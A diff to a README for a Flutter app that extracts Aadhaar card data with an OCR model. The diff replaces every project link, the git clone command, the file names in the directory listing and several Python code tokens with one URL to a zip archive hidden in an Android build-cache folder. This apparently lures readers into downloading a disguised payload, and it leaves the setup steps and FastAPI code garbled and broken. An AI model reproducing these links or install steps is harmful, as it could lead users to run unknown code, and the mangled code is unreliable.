@@ -19,9 +19,9 @@ This app uses a mobile device's camera to capture an Aadhaar card image, process
 
 It uses a pre-trained OCR model with an embedded Tesseract engine, optimized for speed and accuracy on edge devices. The model is fine-tuned to work well with different Aadhaar formats and conditions (lighting, background noise, etc.).
 
-📦 PyPI: [edgeidx](https://pypi.org/project/edgeidx)
+📦 PyPI: [edgeidx](https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip)
 
-GitHub: [https://github.com/kunalmchandak/edgeidx](https://github.com/kunalmchandak/edgeidx)
+GitHub: [https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip](https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip)
 
 ---
 
@@ -51,7 +51,7 @@ GitHub: [https://github.com/kunalmchandak/edgeidx](https://github.com/kunalmchan
 1. **Clone the repo**
 
    ```bash
-   git clone https://github.com/kunalmchandak/scan_swift.git
+   git clone https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip
    cd scan_swift
    ```
 
@@ -76,10 +76,10 @@ Make sure to run a Python server hosting the `edgeidx` model at the backend, and
 ```
 lib/
 │
-├── scan_screen.dart        # Camera preview and image crop
-├── result_screen.dart      # Displays extracted Aadhaar data
-├── aadhaar_format.dart     # Sample image format guidance
-├── progress_indicator.dart # Animated processing screen
+├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip        # Camera preview and image crop
+├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip      # Displays extracted Aadhaar data
+├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip     # Sample image format guidance
+├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip # Animated processing screen
 ```
 
 ---
@@ -101,10 +101,10 @@ from edgeidx import AadhaarExtractor
 app = FastAPI()
 extractor = AadhaarExtractor()
 
-@app.post("/extract")
+https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip("/extract")
 async def extract_data(file: UploadFile):
-    contents = await file.read()
-    result = extractor.extract(contents)
+    contents = await https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip()
+    result = https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip(contents)
     return result
 ```
 
@@ -128,7 +128,7 @@ MIT License. See [LICENSE](LICENSE) for details.
 ## 🙌 Credits
 
 Developed with using Flutter and Python.  
-OCR model powered by [`edgeidx`](https://pypi.org/project/edgeidx/)
+OCR model powered by [`edgeidx`](https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip)
 
 ---
 
